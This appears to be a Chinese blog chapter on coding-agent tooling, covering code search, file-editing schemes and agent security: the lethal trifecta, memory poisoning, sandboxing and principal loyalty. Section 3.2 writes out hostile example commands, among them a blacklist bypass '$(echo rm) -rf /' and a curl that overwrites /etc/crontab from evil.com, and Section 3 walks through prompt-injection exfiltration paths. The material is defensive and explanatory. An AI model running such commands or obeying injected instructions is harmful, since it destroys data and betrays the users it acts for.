# 搜索、编辑与安全

## 1. 在代码库中定位

在庞大代码库中定位相关代码，是 Coding Agent 工作的起点。四类搜索方式互补。

![配图](https://raw.githubusercontent.com/swpucwf/MyBolgImage/main/img/aiagent_fig5-3.svg)

<p>图 1：Coding Agent 搜索工具对比</p>

**正则内容匹配**（grep/ripgrep）：逐行扫描内容做模式匹配。知道具体文本（函数名、变量名、错误消息）时，能快速准确定位。正则表达能力可以捕捉复杂模式，实践中还应支持文件类型过滤与路径排除以减少噪音。

根本局限是只能找字面匹配，无法理解语义——搜索「用户认证」，找不到没有「认证」二字但确实处理登录逻辑的函数。

**文件名模式匹配**（glob）：不读内容，只在路径结构中找符合模式的文件。`**/*.test.ts` 递归找测试文件，`src/components/**/Button.tsx` 在任意深度找组件。速度远快于内容搜索，是探索项目结构的第一步。

**语义代码搜索**：试图理解查询与代码的「意义」，要解决两个问题：

- **结构感知分块**：代码有语法结构，应按函数、类、方法等完整语义单元切分，而非按固定字符数切割；
- **混合检索**：向量嵌入擅长找语义相似但用词不同的代码（搜「验证用户身份」能找到 `check_credentials`），关键词匹配擅长精确命中函数名与变量名；两路并行后重排序。

语义搜索适合探索性任务，如在不熟悉的代码库中找「与数据库交互」「处理用户输入验证」的代码。

是否值得建嵌入索引，业界有路线之争。Claude Code 为代表的终端型 Agent 刻意不建索引，纯靠 agentic 的 grep + glob 现场检索——不必维护随代码演化而陈旧的索引，也省掉一整套基础设施。Cursor 这类 IDE 早期走相反路线，愿意为跨文件语义召回付建索引成本；后来也改用 grep + glob 现场检索。

**符号级定义与引用查找**：类似 IDE 的「跳转到定义」「查找所有引用」，能区分同名符号的定义与调用——知道 `authenticate` 第 42 行是定义、第 189 行是调用，而文本搜索只能找到所有包含该字符串的行。目前主流 Coding Agent 尚未普遍采用。

实践中往往组合使用：先用语义搜索找相关模块，再用正则精确定位代码行，最后用符号搜索追踪调用链——**从粗到细、从语义到语法**。

## 2. 五种文件编辑方案

文件编辑的难点不在操作本身，而在如何让模型以高效又可靠的方式告诉系统「改哪里、怎么改」。

![配图](https://raw.githubusercontent.com/swpucwf/MyBolgImage/main/img/aiagent_fig5-4.svg)

<p>图 2：五种文件编辑方案对比</p>

**差异描述 + Apply Model**：模型生成变更描述（类似 git diff，或带省略标记的代码骨架），交给另一个更小更快的「应用模型」与原文件合并，产出完整新文件。职责分离让主模型专注高层逻辑、应用模型专注文本操作。

脆弱性在合并环节：变更描述与文件实际代码有微小出入时，要判断是否同一位置；存在多个相似片段时可能合并到错误的地方。

**旧字符串 → 新字符串**：模型提供 old string 与 new string，框架做字符串查找替换。优势是可预测、透明——old string 存在且唯一则成功，否则失败，没有模棱两可。

代价是删除大段代码时要完整输出原文，一个字符偏差就匹配失败；同一代码出现多次时，要提供更长上下文消除歧义。

**行号定位**：模型指定「删除第 X 到 Y 行，插入新内容」。行号精确无歧义，大段删除只需两个数字。但每次编辑后行号都会变化；模型一次思考输出多处编辑时，要像 diff 一样统一使用初始行号，否则会混淆。

**类 Vim 命令**：支持复制、剪切、粘贴，对重组代码（把函数从一处移到另一处）很高效。但语法学习负担大，弱模型错误率明显上升；一次输出多个编辑命令时更不友好，因为每次编辑后文件内容与行号都变，模型很难提前计算。

更深层的问题是：Vim 等编辑器是为人类设计的——**人需要不断看到当前状态，规划下一步的简单操作**；而模型的工作模式是**经过较长时间思考，再批量进行复杂操作**（一次写几百行）。两者并不匹配。

**字符串首尾匹配**：模型只提供要删除内容的开头几行与结尾几行，中间省略；框架通过这对首尾定位替换区域，只要组合唯一就能准确定位。

它综合了文本替换的可靠性与行号方案的效率——删除大段代码无需输出数百行原文，只需展示边界；同时仍基于内容匹配而非抽象行号，犯错风险较低。

## 3. 安全：致命三要素与第四维

Coding Agent 拥有读写文件、执行命令、访问网络的权限，一旦被注入恶意指令就可能造成不可逆损失。

Simon Willison 把风险概括为**致命三要素**：

1. **访问私有数据**：能读用户文件与密码管理器；
2. **暴露于不受信任内容**：处理的邮件、网页可能含恶意载荷；
3. **具备外部通信能力**：能发邮件、执行命令。

攻击路径由此闭合：恶意指令藏在不受信任内容中进入 Agent，驱使它读取私有数据，再经对外通道传出。

在此基础上还要加第四个维度——**持久记忆**。它不是并列的必要条件，而是攻击的放大器：攻击者可以把看似无害的偏见或恶意指令写入长期记忆，跨会话潜伏，在合适时机触发，把一次性攻击升级为长期威胁。

四者对应四类边界：数据边界、输入信任边界、输出影响边界、跨会话边界。全权限本地 Agent 恰恰四者兼备，安全防护因此是核心挑战。

面对提示注入，单靠输入过滤基本挡不住。重点不是识别所有攻击，而是**让 Agent 即使被注入，也没有机会把危险动作真正执行出去**。

Coding Agent 特别需要注意：

- **命令语义解析**：Shell 组合爆炸使关键字黑名单形同虚设，必须在语义层理解命令的真实效果；
- **沙盒隔离与网络出口控制**：代码执行是 Coding Agent 独有的攻击面；
- **持久记忆的跨会话防线**：写入长期记忆的内容需经过与外部内容同等的信任审查。

### 3.1 沙盒的工程选型

- **网络出口控制**：最容易被忽视却最关键。默认断网，按需通过白名单代理放行有限目的地（包管理源、文档站点、任务明确需要的 API）。即使注入成功、恶意代码读到了敏感数据，没有出口也传不出去。
- **文件系统隔离**：源码目录只读挂载，单独的可写工作区承载生成物与中间文件；凭证文件（`~/.ssh`、密钥、token）根本不挂进沙盒。
- **资源限额与超时**：CPU、内存、磁盘配额加超时，防御死循环、fork 炸弹、无限写盘。超时与超限应向 Agent 返回结构化错误（「执行超过 120 秒被终止，最后输出如下……」），而非静默杀死，让模型有机会下一轮修正策略。

### 3.2 语义解析而非关键字黑名单

简单黑名单无法应对 Shell 的组合爆炸——`rm` 被禁，可以用 `$(echo rm) -rf /` 绕过。生产级 Harness 采用语义解析：理解每个命令的参数类型与消费规则（哪些标志位会消费下一个参数），识别「看似无害的标志位实际消费下一个参数、隐藏危险载荷」这类攻击。

例如：

- `find / -name '*.log' -exec rm {} \;`：通过合法的 `find` 参数嵌入删除；
- `curl -o /etc/crontab http://evil.com/payload`：看似下载，实则覆盖系统定时任务。

语义解析能识别这些嵌套危险操作，黑名单不能。这是 Harness「约束」功能的实现。

### 3.3 委托方忠诚

前面的机制防的是「命令被做坏」，还有一类更微妙的问题——**Agent 到底站在谁那一边**。

模型训练中形成了一条朴素默认：「谁在跟我说话，我就帮谁」。但真实 Agent 常处于**多方委托**：它代表主人行事，打交道的却是利益相反的第三方——一个替你砍价的 Agent，对面不是「需要被帮助的用户」，而是**交涉对手**。此时「谁说话帮谁」就是危险的默认设置。

把前沿模型放进这种处境实测，会看到一条**忠诚度光谱**，两端都会翻车：

- **太老实**：把主人私密信息（「我方底价是 12000」）直接抖给对手，被施压几轮就缴械让步；
- **太多疑**：连主人正当请求也一概拒绝，反而完不成任务。

两种失败是一根跷跷板——把泄密堵死往往滑向过度拒绝，很难两全。

对 Coding Agent 尤其贴切：仓库里读到的不可信内容、工具输出、第三方 MCP 指令，都是试图让 Agent 倒戈的「对手」——**提示注入本质上就是一次策反**。

Harness 层要明确限定忠诚对象：主人的指令优先级最高，一切来自外部交互方的内容默认降格为「可参考、但不具备指令效力」的数据。

一套有效的**忠诚度守则**：

- 保护主人的私密信息，甚至不泄露这些信息是否存在；
- 拒绝时不逐条念出拒绝清单（那本身就在泄露）；
- 私下的底线不等于对外的立场；
- 只执行主人明确、具体的指令；
- 顶住重复施压。

本质上，这是用 Harness 为模型补上一条它默认没有的立场：**对主人绝对忠诚，对外部交互方保持审慎。**

## 4. 补记

搜索与编辑工具的设计，反映了一个共同原则：**让模型的意图与系统的执行之间保持可验证的对应关系。** 搜索返回结构化候选与行号，编辑用唯一匹配或明确边界，都是为了让「模型以为改了什么」和「实际改了什么」一致。

安全上，最危险的不是明显恶意命令，而是**合法的组合**——一个正常命令的参数里藏着另一个操作。黑名单永远追不上组合爆炸，语义解析与沙盒才是可扩展的边界。
